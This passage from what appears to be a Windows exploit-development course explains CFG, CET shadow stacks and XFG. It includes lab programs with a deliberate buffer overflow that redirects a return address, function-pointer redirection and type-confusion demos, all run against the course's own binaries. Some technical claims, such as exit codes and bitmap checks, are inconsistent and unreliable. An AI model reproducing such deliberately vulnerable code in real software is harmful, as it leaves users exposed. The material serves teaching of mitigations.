; - Returns if valid, terminates if invalid
```

#### Deep Dive: CFG Bitmap Structure and Validation

**CFG Bitmap Architecture**:

```text
CFG Bitmap Memory Layout:
-------------------------

The CFG bitmap is a large array where each BIT represents whether
a 16-byte aligned address is a valid indirect call target.

> Note: With XFG enabled, the bitmap uses 2 bits per entry instead of 1,
> encoding both validity and type-hash metadata.

Address Space (User Mode):     CFG Bitmap:
┌────────────────────────┐    ┌──────────────┐
│ 0x00000000`00000000    │--->│ Bit 0        │
│ 0x00000000`00000010    │--->│ Bit 1        │
│ 0x00000000`00000020    │--->│ Bit 2        │
│ ...                    │    │ ...          │
│ 0x00007FFF`FFFFFFFF    │--->│ Bit N        │
└────────────────────────┘    └──────────────┘

Bitmap Size Calculation (x64 user mode):
- User address space: ~128TB (0x7FFFFFFFFFFF)
- Granularity: 16 bytes per bit
- Bits needed: 128TB / 16 = 8TB bits = 1TB bytes
- Actual: Sparse, on-demand allocation

Bitmap Lookup Algorithm:
bit_index = target_address >> 4  (divide by 16)
byte_index = bit_index >> 3      (divide by 8)
bit_offset = bit_index & 7       (mod 8)
is_valid = (bitmap[byte_index] >> bit_offset) & 1
```

**CFG Dispatch Function Internals**:

```c
// Simplified __guard_check_icall_fptr implementation
// NOTE: This is a conceptual simplification. The actual bitmap pointer
// comes from ntdll internals, not directly from PEB.
void __fastcall __guard_check_icall_fptr(void *target) {
    // Get bitmap base (simplified — actual source is ntdll internal)
    ULONG_PTR bitmap_base = NtCurrentPeb()->CfgBitMap;

    // Calculate bit position
    ULONG_PTR bit_index = (ULONG_PTR)target >> 4;
    ULONG_PTR byte_index = bit_index >> 3;
    ULONG bit_offset = bit_index & 7;

    // Check if valid
    BYTE bitmap_byte = *(BYTE*)(bitmap_base + byte_index);
    if (!((bitmap_byte >> bit_offset) & 1)) {
        // Invalid target - terminate
        __fastfail(FAST_FAIL_GUARD_ICALL_CHECK_FAILURE);
        // Process dies immediately, no exception handling
    }
    // Valid - return and allow call
}
```

**CFG Failure Codes**:

```bash
# When CFG blocks a call, it uses __fastfail()
# __fastfail executes: int 0x29 (traps directly to kernel)
# Kernel kills the process immediately — no user-mode handler runs

# Process exit code: 0x80000003 (STATUS_BREAKPOINT)
# This is the ACTUAL exit code you see from GetExitCodeProcess()
# NOTE: NOT 0xC0000409 — that's the old-style /GS cookie failure.
# __fastfail via int 0x29 produces STATUS_BREAKPOINT.

# Fast Fail Codes passed via ECX to int 0x29 (winnt.h):
FAST_FAIL_GUARD_ICALL_CHECK_FAILURE = 10  # CFG indirect call check failed
FAST_FAIL_GUARD_WRITE_CHECK_FAILURE = 11  # CFG write check (rare)
FAST_FAIL_GUARD_JUMP_CHECK_FAILURE  = 12  # CFG jump check
FAST_FAIL_GUARD_SS_FAILURE          = 37  # CET shadow stack mismatch

# In WinDbg after CFG kill:
!analyze -v
# FAILURE_BUCKET_ID: FAIL_FAST_GUARD_ICALL_CHECK_FAILURE
# Look for: SubCode = 10 (0xA) in the exception parameters

# Exception record:
.exr -1
# ExceptionCode: 0xC0000409 (STATUS_STACK_BUFFER_OVERRUN)
# ExceptionInformation[0]: fast fail code (10 = CFG, 37 = CET)
# BUT the PROCESS EXIT CODE is 0x80000003 (STATUS_BREAKPOINT)
# This distinction matters when checking exit codes in exploits!

# Verifying from command line:
echo %errorlevel%
# Or in Python: p.returncode & 0xFFFFFFFF == 0x80000003
```

**Populating the CFG Bitmap**:

```text
When is a bit SET in the CFG bitmap?

At Image Load Time:
1. Loader reads Guard CF Function Table from PE
   - This table is created by the linker.
   - It includes all address-taken functions *except* those marked with `__declspec(guard(suppress))`.
2. For each address in table:
   - Calculate bit position
   - Set bit in bitmap
3. Export table entries also marked valid
4. DLL entry points marked valid

PE Header Fields:
- GuardCFCheckFunctionPointer
- GuardCFDispatchFunctionPointer
- GuardCFFunctionTable (array of valid targets)
- GuardCFFunctionCount
- GuardFlags

Viewing in PE:
dumpbin /loadconfig myapp.exe
# Look for:
# Guard CF address of check-function pointer
# Guard CF function table
# Guard CF function count
```

**Compiler Instrumentation**:

```c
// What the compiler does with /guard:cf

// Original code:
void (*callback)(int);
callback = get_function_pointer();
callback(42);

// Compiled with CFG:
void (*callback)(int);
callback = get_function_pointer();

// Compiler inserts:
__guard_check_icall_fptr(callback);  // <-- Added
callback(42);

// In assembly (x64):
mov     rax, [rbp+callback]
mov     rcx, rax                    ; target in rcx
call    [__guard_check_icall_fptr]  ; validate
call    rax                         ; call if valid
```

**CFG Export Suppression**:

```c
// Some functions should NOT be valid CFG targets
// Use __declspec(guard(suppress))

__declspec(guard(suppress))
void internal_gadget_like_function() {
    // This function won't be in CFG bitmap
    // Attackers can't call it via indirect call
}

// Useful for functions that look like ROP gadgets
// or have dangerous functionality
```

**Testing CFG — Valid vs Invalid Targets**:

```c
// cfg_test.c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// Valid CFG Target 1
void legitimate_function() {
    printf("[*] Legitimate function called\n");
    fflush(stdout);
}

// Valid CFG Target 2
void another_function() {
    printf("[*] Another function called\n");
    fflush(stdout);
}

// Invalid CFG Target (Suppressed)
// This function exists and is executable, but we tell the compiler
// NOT to add it to the CFG valid target bitmap.
__declspec(guard(suppress))
void suppressed_function() {
    printf("[!] EXPLOIT SUCCESS: Suppressed function executed!\n");
    printf("[!] This should ONLY happen if CFG is disabled.\n");
    fflush(stdout);
}

int main(int argc, char **argv) {
    void (*func_ptr)();

    // Test 1: Call valid function
    printf("[*] Test 1: Calling legitimate_function (valid)\n");
    fflush(stdout);
    func_ptr = legitimate_function;
    func_ptr();

    // Test 2: Redirect to another valid function
    // CFG Limitation: It validates "is this A start of A function",
    // not "is this the INTENDED function".
    printf("[*] Test 2: Redirecting to another_function (valid)\n");
    fflush(stdout);
    func_ptr = another_function;
    func_ptr();

    // Test 3: Call suppressed function
    // - Memory: Valid (it's a real function)
    // - CFG Bitmap: Invalid (suppressed)
    // This distinguishes CFG protection from generic Access Violations.
    printf("[*] Test 3: Calling suppressed_function (invalid CFG target)\n");
    fflush(stdout);

    // Use volatile to prevent the compiler from optimizing away the indirect call
    void (* volatile vfunc_ptr)() = suppressed_function;
    vfunc_ptr();  // With CFG: Terminate (__fastfail). Without CFG: Execute.

    printf("[-] Should not reach here if CFG is working\n");
    return 0;
}
```

**Compile & Run**:

```bash
# With CFG
cl /Zi /guard:cf src\cfg_test.c /Fe:bin\cfg_test.exe /link /guard:cf /DEBUG
.\bin\cfg_test.exe
#[*] Test 1: Calling legitimate_function (valid)
#[*] Legitimate function called
#[*] Test 2: Redirecting to another_function (valid)
#[*] Another function called
#[*] Test 3: Calling suppressed_function (invalid CFG target)

# Without CFG
cl /Zi src\cfg_test.c /Fe:bin\cfg_test_nocfg.exe /link /DEBUG
.\bin\cfg_test_nocfg.exe
#[*] Test 1: Calling legitimate_function (valid)
#[*] Legitimate function called
#[*] Test 2: Redirecting to another_function (valid)
#[*] Another function called
#[*] Test 3: Calling suppressed_function (invalid CFG target)
#[!] EXPLOIT SUCCESS: Suppressed function executed!
#[!] This should ONLY happen if CFG is disabled.
#[-] Should not reach here if CFG is working
```

### Intel Control-Flow Enforcement Technology (CET)

**What is CET?**:

- Hardware-based control-flow integrity
- Two components: Shadow Stack + Indirect Branch Tracking
- Requires CPU support (Intel 11th gen+ / AMD Zen 3+)
- Available on Windows 11, increasingly enabled by default on 24H2+
- **Important**: Full enforcement requires:
  - Supported CPU with CET capability
  - Binary compiled with `/CETCOMPAT` flag (CETCOMPAT bit in PE header)
  - Process mitigation policy enabling UserShadowStack
  - Verify actual status via `Get-ProcessMitigation -Name <process>` (Warning: Shows policy, not hardware enforcement)

**Shadow Stack**:

```text
Regular Stack:        Shadow Stack (Hardware):
┌────────────┐       ┌────────────┐
│ Local vars │       │            │
├────────────┤       ├────────────┤
│ Saved RBP  │       │ Return addr│ <- Copy of return address
├────────────┤       └────────────┘
│ Return addr│ <- User-accessible   Hardware-protected
└────────────┘

On function call:
- Regular return address pushed to stack
- ALSO pushed to shadow stack (by CPU)

On function return:
- Pop return address from regular stack
- Pop from shadow stack
- Compare both
- If mismatch -> terminate
```

**Benefits**:

- Prevents ROP attacks
- Return address cannot be overwritten
- Hardware enforcement (can't bypass)

**Shadow Stack in Action**:

```c
// ROP attempt
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Overflow
}

// Without CET:
// Overflow overwrites return address
// ROP chain executes

// With CET:
// Overflow overwrites stack return address
// But shadow stack still has original
// On return: mismatch detected -> crash
```

**Indirect Branch Tracking (IBT)**:

```asm
; Valid indirect jump target must have ENDBR instruction

; Without IBT:
jmp rax  ; Jumps anywhere

; With IBT:
jmp rax  ; Target MUST start with ENDBR64/ENDBR32

; Valid target:
target_function:
    endbr64     ; Required for indirect jumps
    push rbp
    mov rbp, rsp
    ...

; Invalid target:
bad_gadget:
    pop rdi     ; No ENDBR = crash if targeted
    ret
```

**Testing CET**:

```bash
# Check if CPU supports CET
Get-CimInstance Win32_Processor | Select-Object Name

# Check if process has CET
Get-ProcessMitigation -Name bin\cet_shadow.exe | findstr "UserShadowStack"
```

**Lab: Shadow Stack Protection vs Return Address Overwrite**

This lab demonstrates CET shadow stack protection by compiling a vulnerable program
with and without CET support, then attempting to overwrite the return address.

Create `src\cet_shadow_test.c`:

```c
// cet_shadow_test.c
// Demonstrates CET Shadow Stack protection against return address overwrites.
//
// Without CET: Buffer overflow overwrites return address, executes malicious_function
// With CET: Buffer overflow overwrites stack return, but shadow stack has original
//           -> Mismatch detected on RET -> #CP exception -> process killed
//
// Compile WITHOUT CET: cl /Zi /GS- src\cet_shadow_test.c /Fe:bin\cet_no_shadow.exe /link /DEBUG
// Compile WITH CET:    cl /Zi /GS- /guard:cf /cetcompat src\cet_shadow_test.c /Fe:bin\cet_shadow.exe /link /guard:cf /CETCOMPAT /DEBUG

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Malicious function - target for redirection
void malicious_function() {
    // Use puts() instead of printf() to be safer against stack misalignment
    // printf uses vector instructions (movaps) which crash if RSP isn't 16-byte aligned
    puts("");
    puts("PWNED: malicious_function executed!");
    puts("Return address was successfully overwritten");
    puts("This proves CET shadow stack is NOT enabled");
    puts("");

    // Exit cleanly to avoid crashing on return (since stack is trashed)
    ExitProcess(0);
}

void legitimate_function() {
    printf("[*] This is the legitimate function (should never print in exploit)\n");
}

void vulnerable_function(char *input, size_t input_len) {
    char buffer[64];

    printf("[*] Buffer at: %p\n", buffer);
    printf("[*] Input length: %zu bytes\n", input_len);
    printf("[*] Calling memcpy (vulnerable)...\n");
    fflush(stdout);

    // VULNERABILITY: No bounds checking!
    memcpy(buffer, input, input_len);

    printf("[+] memcpy completed\n");
    printf("[*] Returning from vulnerable_function...\n");
    fflush(stdout);

    // On return:
    // - Without CET: Uses overwritten return address from stack
    // - With CET: Compares stack return vs shadow stack return
    //             If mismatch -> #CP exception -> __fastfail
}

void print_addresses() {
    printf("\n[*] Function Addresses:\n");
    printf("  legitimate_function  = %p\n", (void*)legitimate_function);
    printf("  malicious_function   = %p\n", (void*)malicious_function);
    printf("  vulnerable_function  = %p\n\n", (void*)vulnerable_function);
    fflush(stdout);
}

int main(int argc, char **argv) {
    // Disable buffering to ensure we see output before any crash
    setbuf(stdout, NULL);

    printf("CET Shadow Stack Protection Test\n");
    printf("--------------------------------\n\n");

    print_addresses();

    if (argc < 2) {
        printf("Usage: %s <mode>\n", argv[0]);
        printf("  mode:\n");
        printf("  0     - No overflow (normal execution)\n");
        printf("  1     - Overwrite return address (trigger exploit)\n");
        return 1;
    }

    // Check mode
    int mode = 0;
    if (argc > 1) {
        mode = atoi(argv[1]);
    }

    if (mode == 0) {
        printf("[*] Mode 0: Normal execution (no overflow)\n");
        char safe_input[32] = "Hello, World!";
        vulnerable_function(safe_input, strlen(safe_input));
        printf("[+] Returned safely from vulnerable_function\n");
        legitimate_function();
    }
    else {
        printf("[*] Mode 1: Exploit mode - will attempt return address overwrite\n");
        printf("[!] Expected: WITHOUT CET -> malicious_function executes\n");
        printf("[!] Expected: WITH CET -> process killed by #CP exception\n\n");

        // AGGRESSIVE SPRAY: Fill the entire payload with the target address.
        // x64 stack frames can be large and variable. We'll fill enough to cover
        // any reasonable buffer-to-return-address distance.
        char payload[256];
        ULONG_PTR target = (ULONG_PTR)malicious_function;

        // Fill the WHOLE buffer with the address (repeated)
        // This guarantees we hit the return address wherever it is
        for (size_t i = 0; i < sizeof(payload); i += sizeof(target)) {
            memcpy(&payload[i], &target, sizeof(target));
        }

        printf("[*] Crafted payload:\n");
        printf("  Strategy: FULL SPRAY (offsets 0-256)\n");
        printf("  Target: %p (malicious_function)\n", (void*)target);
        printf("  Total payload: %zu bytes\n\n", sizeof(payload));

        vulnerable_function(payload, sizeof(payload));

        printf("[*] If you see this, CET shadow stack blocked the exploit!\n");
        legitimate_function();
    }

    printf("\n[+] Program completed normally\n");
    return 0;
}
```

**Compile & Run**:

```bash
cl /Zi /GS- src\cet_shadow_test.c /Fe:bin\cet_no_shadow.exe /link /DEBUG
.\bin\cet_no_shadow.exe 0
#[*] Mode 0: Normal execution (no overflow)
#[*] Buffer at: 000000893B77F9F0
#[*] Input length: 13 bytes
#[*] Calling memcpy (vulnerable)...
#[+] memcpy completed
#[*] Returning from vulnerable_function...
#[+] Returned safely from vulnerable_function
#[*] This is the legitimate function (should never print in exploit)

#[+] Program completed normally

.\bin\cet_no_shadow.exe 1
#[PWNED: malicious_function executed!]
#[Return address was successfully overwritten]
#[This proves CET shadow stack is NOT enabled]

cl /Zi /GS- /guard:cf /cetcompat src\cet_shadow_test.c /Fe:bin\cet_shadow.exe /link /guard:cf /CETCOMPAT /DEBUG
.\bin\cet_shadow.exe 1
#[*] Mode 1: Exploit mode - will attempt return address overwrite
#[!] Expected: WITHOUT CET -> malicious_function executes
#[!] Expected: WITH CET -> process killed by #CP exception
```

> [!WARNING]
> **Why did my CET test fail in a VM?**
>
> If you see "UserShadowStack: ON" but the exploit still works, **your VM likely does not emulate the required hardware**.
>
> CET requires Intel 11th Gen+ / AMD Zen 3+ physical CPUs _AND_ hypervisor support.
>
> - **VirtualBox**: Does NOT support CET pass-through (as of v7.0).
> - **VMWare**: Requires "Virtualize Intel VT-x/EPT" and specific config.
> - **Hyper-V**: Requires Nested Virtualization enabled correctly.
>
> Without actual hardware `SHSTK` instructions exposed to the guest OS, Windows silently falls back to software-only mode (which does nothing for ROP/buffer overflows), even if the policy says "ON".

#### Deep Dive: CET Shadow Stack Hardware Implementation

**Shadow Stack CPU Instructions**:

```asm
; New instructions added by CET:

; INCSSP - Increment Shadow Stack Pointer
incssp rax      ; Advance SSP by rax * 8 bytes
                ; Used to skip frames during unwinding

; RDSSP - Read Shadow Stack Pointer
rdssp rax       ; Read current SSP into rax
                ; Allows software to inspect shadow stack

; SAVEPREVSSP - Save previous SSP
saveprevssp     ; Saves SSP on shadow stack
                ; Used for stack switching

; RSTORSSP - Restore SSP
rstorssp [mem]  ; Restore SSP from memory
                ; Used when switching back

; WRSS - Write to Shadow Stack
wrss [rsp], rax ; Write rax to shadow stack at rsp
                ; Requires special privileges

; CLRSSBSY - Clear shadow stack busy flag
clrssbsy [mem]  ; Clear busy bit in shadow stack token
```

**Shadow Stack Memory Region**:

```text
Shadow Stack Layout:
--------------------

Regular Stack:                    Shadow Stack:
High Address                      High Address (SSP starts here)
┌────────────────────┐           ┌────────────────────┐
│ Return addr (main) │           │ Return addr (main) │ ← Token
├────────────────────┤           ├────────────────────┤
│ Saved RBP          │           │ Return addr (func1)│
├────────────────────┤           ├────────────────────┤
│ Local vars         │           │ Return addr (func2)│
├────────────────────┤           ├────────────────────┤
│ Return addr (func1)│           │         ...        │
├────────────────────┤           └────────────────────┘
│ ...                │           ^
└────────────────────┘           SSP (Shadow Stack Pointer)
^
RSP

Key Differences:
- Shadow stack ONLY stores return addresses
- No local variables, no saved registers
- Hardware manages writes (software can only read)
- Separate memory region with special protections
```

**CET Exception Handling**:

```text
When CET Detects Mismatch:
--------------------------

1. CALL instruction:
   - CPU pushes return address to regular stack
   - CPU pushes return address to shadow stack (automatically)

2. RET instruction:
   - CPU pops return address from regular stack
   - CPU pops return address from shadow stack
   - CPU COMPARES both values

3. If mismatch:
   - CPU raises #CP (Control Protection Exception)
   - Exception code: STATUS_CONTROL_STACK_VIOLATION (0xC0000407)
   - OS converts to __fastfail(FAST_FAIL_GUARD_SS_FAILURE = 37)
   - __fastfail executes int 0x29 -> kernel kills process
   - Process exit code: 0x80000003 (STATUS_BREAKPOINT)
   - NOTE: The exception code (0xC0000407) and process exit code
     (0x80000003) are DIFFERENT — same mechanism as CFG failures.

4. In WinDbg:
   !analyze -v
   # Shows CONTROL_PROTECTION_VIOLATION
   # Parameters indicate specific CET violation type
   # SubCode = 37 (0x25) = FAST_FAIL_GUARD_SS_FAILURE
   .exr -1
   # ExceptionCode: 0xC0000409 (STATUS_STACK_BUFFER_OVERRUN)
   # ExceptionInformation[0]: 37 (shadow stack failure)
```

**Indirect Branch Tracking (IBT) Detail**:

```asm
; IBT requires ENDBR at valid branch targets

; Compiler generates:
my_callback:
    endbr64                 ; Must be first instruction!
    push rbp
    mov rbp, rsp
    ; ... function body ...

; On indirect branch:
call rax                    ; CPU sets TRACKER state to WAIT_FOR_ENDBR
; At target:
endbr64                     ; Clears TRACKER state, execution continues

; If target lacks ENDBR:
; CPU raises #CP (Control Protection Exception)

; ENDBR64 encoding: F3 0F 1E FA
; Just a fancy NOP on older CPUs (backward compatible)
```

### Kernel Shadow Stack

**What is Kernel Shadow Stack?**:

- Extends CET shadow stack protection to kernel mode
- Requires VBS (Virtualization-Based Security) enabled
- Hypervisor-enforced integrity - even kernel read/write can't bypass
- Enabled by default on Windows 11 24H2 with supported hardware

**Requirements**:

- Intel 11th gen+ or AMD Zen 3+ CPU with CET support
- VBS/HVCI enabled
- Windows 11 24H2 or later

**Checking Kernel Shadow Stack**:

```bash
# Check if enabled
# Look for value 5 in the output (Kernel-mode Hardware-enforced Stack Protection)
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object -ExpandProperty SecurityServicesRunning
# Output Reference:
# 0 = None (Disabled)
# 1 = Credential Guard
# 2 = Memory Integrity (HVCI)
# 5 = Kernel-mode Hardware-enforced Stack Protection (Shadow Stack)

# Via msinfo32
msinfo32.exe
# Look for: Kernel DMA Protection, Virtualization-based security
```

**Impact on Kernel Exploitation**:

- ROP chains in kernel mode detected and blocked
- Return address tampering causes immediate bugcheck
- Significantly raises bar for kernel exploits

### eXtended Flow Guard (XFG)

**What is XFG?**:

- Enhanced version of CFG
- Validates function pointer types
- Prevents type confusion attacks

**XFG vs CFG Comparison**:

| Feature           | CFG               | XFG                                                                    |
| ----------------- | ----------------- | ---------------------------------------------------------------------- |
| Validation        | Address in bitmap | Address + type signature                                               |
| Granularity       | Function-level    | Call-site specific                                                     |
| Bypass difficulty | Known bypasses    | Significantly harder                                                   |
| Availability      | Windows 8.1+      | Windows 11 (metadata generated; enforcement rolling out incrementally) |

**How XFG Works**:

```c
// CFG check (simplified):
if (bitmap[target >> 4] & (1 << (target & 0xF))) {
    call target;  // Valid function address
}

// XFG check (simplified):
if (target_hash == expected_hash) {
    call target;  // Valid AND correct type signature
}
```

**XFG Type Hashes**:

- Compiler generates hash based on function prototype
- Hash stored at function entry point (before ENDBR)
- Runtime validates hash matches expected call signature

**How XFG Improves CFG**:

```c
// CFG only checks: is target a valid function?
// XFG also checks: does target match expected signature?

typedef void (*HandlerA)(int);
typedef void (*HandlerB)(char*);

void process(HandlerA handler) {
    handler(42);  // Expects (int) parameter
}

// Attack: Pass HandlerB with different signature
HandlerB wrong_handler = get_wrong_handler();

// CFG: Allows (both are valid functions)
// XFG: Blocks (signature mismatch!)
```

**XFG Metadata**:

- Each function pointer has associated metadata:
  - Expected function signature hash
  - Parameter count and types
  - Return type
- Before call:
  - Check CFG bitmap (address valid?)
  - Check XFG metadata (signature matches?)
  - If both pass -> allow call

**Understanding XFG Behavior**:

```c
// xfg_concept.c — Type Confusion Demonstration (CFG vs XFG)
// Demonstrates that CFG allows type-confused calls between valid functions,
// while XFG (when enforced) would block them based on signature mismatch.
//
// Test modes:
//   1: Correct type call (always works)
//   2: Type-confused call (CFG allows, XFG would block)
//   3: Invalid address call (CFG blocks with __fastfail)

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

typedef void (*IntHandler)(int);
typedef void (*StrHandler)(char*);
typedef void (*NoArgHandler)(void);

void int_handler(int x) {
    printf("[*] int_handler called with: %d\n", x);
    fflush(stdout);
}

void str_handler(char *s) {
    // Print pointer value (%p) instead of string (%s) to avoid Access Violation
    // when called with an integer (e.g., 42) during type confusion test.
    printf("[*] str_handler called with: %p\n", (void*)s);
    fflush(stdout);
}

void noarg_handler(void) {
    printf("[*] noarg_handler called (no arguments)\n");
    fflush(stdout);
}

void call_int_handler(IntHandler handler, int value) {
    printf("[*] Calling through IntHandler pointer...\n");
    fflush(stdout);
    handler(value);
}

int main(int argc, char **argv) {
    int test_mode = 1;
    if (argc > 1) test_mode = atoi(argv[1]);

    printf("[*] XFG Type Confusion Test\n");
    printf("[*] int_handler at: %p\n", (void*)int_handler);
    printf("[*] str_handler at: %p\n", (void*)str_handler);
    printf("[*] noarg_handler at: %p\n\n", (void*)noarg_handler);
    fflush(stdout);

    if (test_mode == 1) {
        // TEST 1: Correct type — always works
        printf("[*] TEST 1: Correct type (IntHandler -> int_handler)\n");
        IntHandler correct = int_handler;
        call_int_handler(correct, 42);
        printf("[+] Call succeeded (correct signature)\n");
    }
    else if (test_mode == 2) {
        // TEST 2: Type confusion — CFG allows, XFG would block
        printf("[*] TEST 2: Type confusion (IntHandler -> str_handler)\n");
        printf("[!] Casting StrHandler (char*) to IntHandler (int)\n");
        printf("[!] CFG: Allows (both are valid function entries)\n");
        printf("[!] XFG: Would block (signature mismatch)\n\n");
        fflush(stdout);

        IntHandler confused = (IntHandler)str_handler;
        call_int_handler(confused, 42);
        printf("[+] Call succeeded — CFG is coarse-grained!\n");
        printf("[!] str_handler received garbage (42 instead of char*)\n");
    }
    else if (test_mode == 3) {
        // TEST 3: Invalid address — CFG blocks
        printf("[*] TEST 3: Invalid address (0xDEADBEEF)\n");
        printf("[!] Not a valid function entry — CFG will block\n");
        fflush(stdout);

        IntHandler invalid = (IntHandler)0xDEADBEEF;
        call_int_handler(invalid, 42);
        printf("[-] Should not reach here\n");
    }

    fflush(stdout);
    return 0;
}
```

**Compile & Run**:

```bash
cl /Zi /guard:cf src\xfg_concept.c /Fe:bin\xfg_concept.exe /link /guard:cf /DEBUG
.\bin\xfg_concept.exe 1
#[*] XFG Type Confusion Test
#[*] int_handler at: 00007FF64B8C1C50
#[*] str_handler at: 00007FF64B8C6670
#[*] noarg_handler at: 00007FF64B8C5FE0

#[*] TEST 1: Correct type (IntHandler -> int_handler)
#[*] Calling through IntHandler pointer...
#[*] int_handler called with: 42
#[+] Call succeeded (correct signature)

.\bin\xfg_concept.exe 2
#[*] XFG Type Confusion Test
#[*] int_handler at: 00007FF64B8C1C50
#[*] str_handler at: 00007FF64B8C6670
#[*] noarg_handler at: 00007FF64B8C5FE0

#[*] TEST 2: Type confusion (IntHandler -> str_handler)
#[!] Casting StrHandler (char*) to IntHandler (int)
#[!] CFG: Allows (both are valid function entries)
#[!] XFG: Would block (signature mismatch)

#[*] Calling through IntHandler pointer...
#[*] str_handler called with: 000000000000002A
#[+] Call succeeded — CFG is coarse-grained!
#[!] str_handler received garbage (42 instead of char*)

# =========================================================================
# NOTE: If XFG were strictly ENFORCED, the process would terminate silently
# before printing the "str_handler called with..." line above.
# The fact that it prints means XFG is in audit/permissive mode or unsupported.
# =========================================================================

.\bin\xfg_concept.exe 3
#[*] XFG Type Confusion Test
#[*] int_handler at: 00007FF64B8C1C50
#[*] str_handler at: 00007FF64B8C6670
#[*] noarg_handler at: 00007FF64B8C5FE0

#[*] TEST 3: Invalid address (0xDEADBEEF)
#[!] Not a valid function entry — CFG will block
#[*] Calling through IntHandler pointer...
# NOTE: (Process terminated via __fastfail)

dumpbin /loadconfig bin\xfg_concept.exe | findstr -i "XFG"
#Dump of file bin\xfg_concept.exe
#    00000001400B7010 Guard XFG address of check-function pointer
#    00000001400B7030 Guard XFG address of dispatch-function pointer
#    00000001400B7040 Guard XFG address of dispatch-table-function pointer
```

> [!IMPORTANT]
> **XFG Enforcement is OS-Level, Not Compiler-Level**: The compiler generates XFG metadata
> (type hashes) when `/guard:cf` is used on recent MSVC versions. However, **whether XFG
> type checking is actually enforced** depends on the Windows version and configuration.
> On most current systems, Test 2 will SUCCEED because CFG is enforced (coarse-grained)
> but XFG type validation is not yet widely enforced. XFG represents the **future direction**
> of Windows CFI, where type-confused calls will be blocked.

### Practical Exercise

#### Task 1: CFG Coarse-Grained Analysis

Build a program that demonstrates BOTH what CFG blocks and what it allows:

```c
// cfg_analysis.c — Task 1: Prove CFG's coarse-grained limitation
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

typedef int (*MathOp)(int, int);

int add(int a, int b) { printf("[+] add(%d,%d) = %d\n", a, b, a+b); return a+b; }
int sub(int a, int b) { printf("[+] sub(%d,%d) = %d\n", a, b, a-b); return a-b; }
int pwn(int a, int b) { printf("[!] PWNED via redirect to pwn()!\n"); return 0xDEAD; }

int main(int argc, char **argv) {
    MathOp op = add;
    printf("[*] add at %p, sub at %p, pwn at %p\n",
           (void*)add, (void*)sub, (void*)pwn);
    fflush(stdout);

    if (argc > 1 && argv[1][0] == '1') {
        // Redirect to another valid function — CFG ALLOWS
        printf("[*] Redirecting function pointer to pwn()...\n");
        op = pwn;
    } else if (argc > 1 && argv[1][0] == '2') {
        // Redirect to shellcode address — CFG BLOCKS
        printf("[*] Redirecting function pointer to 0xBAADF00D...\n");
        op = (MathOp)0xBAADF00D;
    }
    fflush(stdout);
    int result = op(10, 5);
    printf("[*] Result: %d\n", result);
    return 0;
}
```

```bash
# Compile with and without CFG
cl /Zi /guard:cf src\cfg_analysis.c /Fe:bin\cfg_analysis.exe /link /guard:cf /DEBUG

# Test 1: valid redirect -> CFG allows
.\bin\cfg_analysis.exe 1
# Expected: [!] PWNED via redirect to pwn()!

# Test 2: invalid redirect -> CFG blocks
.\bin\cfg_analysis.exe 2
# Expected: Process terminates immediately.
# Note: You may see 0xC0000005 (Access Violation) if the CFG bitmap for that address is unmapped.

# Verify in WinDbg:
windbg bin\cfg_analysis.exe 2
# > g
# !analyze -v -> FAIL_FAST_GUARD_ICALL_CHECK_FAILURE or INVALID_POINTER_READ
```

#### Task 2: CET Shadow Stack Verification

Verify that CET is active on your system and understand its impact:

```bash
# 1. Check CPU support for CET
Get-CimInstance -ClassName Win32_Processor | Select-Object Name, Caption
# Intel 12th gen+ or AMD Zen 3+ have CET

# 2. Check if shadow stacks are enforced
Get-ProcessMitigation -System | Select-Object -ExpandProperty UserShadowStack
# Look for: Enable = ON, AuditMode = OFF

# 3. Check per-process CET status
Get-ProcessMitigation -Name notepad.exe | Select-Object -ExpandProperty UserShadowStack

# 4. Verify in WinDbg (needs kernel debugging enabled)
# bcdedit -debug on, and the rest ...
windbg -pn notepad.exe
# In WinDbg:
# !process 0 0
# .process /i <EPROCESS>
# g
# dt nt!_KTHREAD @$thread UserShadowStacksEnabled
```

> [!NOTE]
> You cannot easily test CET bypass because CET **completely blocks** return address
> tampering — there is no "allowed" case. Any ROP chain or return address overwrite
> causes immediate shadow stack mismatch -> `__fastfail(37)` -> exit code `0x80000003`.
> This is fundamentally different from CFG, which has a coarse-grained bypass.

### Comparing CFG, CET, and XFG

| Feature               | CFG                          | CET                          | XFG                       |
| --------------------- | ---------------------------- | ---------------------------- | ------------------------- |
| **Protects**          | Indirect calls/jumps         | Return addresses             | Function type matching    |
| **Mechanism**         | Software bitmap              | Hardware shadow stack        | Enhanced CFG + type hash  |
| **Requires**          | Windows 8.1+                 | Intel 11th+ / Zen 3+ + Win11 | Windows 11 22H2+          |
| **Overhead**          | ~1-5%                        | <1% (hardware)               | ~2-7%                     |
| **Granularity**       | Coarse (any valid function)  | Exact (per-return address)   | Fine (per-call-site type) |
| **Bypass Difficulty** | Medium (valid-func redirect) | Very Hard (hardware)         | Hard                      |
| **Exit code on kill** | 0x80000003 (\_\_fastfail)    | 0x80000003 (\_\_fastfail)    | 0x80000003 (\_\_fastfail) |

### Key Takeaways

1. **CFG is coarse-grained**: It checks "is the target ANY valid function entry?" — not
   "should THIS call site dispatch to THAT function." This means redirecting a function
   pointer to a different-but-valid function **bypasses CFG**. We proved this in Day 2
   Technique 3 and again in the vtable test above.
2. **CET completely blocks ROP**: Shadow stacks are hardware-enforced — any return address
   mismatch causes immediate termination. Unlike CFG, there is no "allowed" bypass case.
   CET eliminates return-oriented programming entirely on supported hardware.
3. **CFG exit code is 0x80000003**: `__fastfail` executes `int 0x29` which traps to the
   kernel. The process exit code is STATUS_BREAKPOINT (0x80000003), NOT 0xC0000409. The
   exception record contains the detailed fast-fail code (10 for CFG, 37 for CET).
4. **XFG improves CFG with type hashes**: XFG validates that the target function's
   signature matches what the call site expects. This closes the coarse-grained gap.
   However, XFG is OS-managed — there is no public `/guard:xfg` compiler flag.
5. **Data-only attacks bypass all CFI**: Since CFG/CET/XFG only protect control flow
   (function pointers and return addresses), attacks that corrupt data without changing
   code flow remain effective. Example: overwriting an `is_admin` flag or authentication
   token without touching any function pointer.
6. **Layered defense is essential**: CFG handles indirect calls, CET handles returns,
   XFG handles type confusion. No single mechanism covers everything.
7. **Win32k filtering removes massive attack surface**: Browser renderers that block
   win32k.sys syscalls eliminate 1200+ kernel attack surface functions.
